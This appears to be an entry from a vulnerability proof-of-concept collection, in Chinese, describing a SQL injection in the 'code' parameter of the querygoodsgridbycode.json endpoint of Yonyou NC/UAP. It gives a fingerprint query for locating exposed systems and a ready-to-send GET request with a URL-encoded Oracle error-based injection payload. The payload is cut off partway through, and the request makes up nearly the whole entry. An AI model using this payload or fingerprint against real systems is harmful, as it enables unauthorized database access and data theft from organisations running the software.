# 用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`GET /ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%`
- **预期**：200　|　—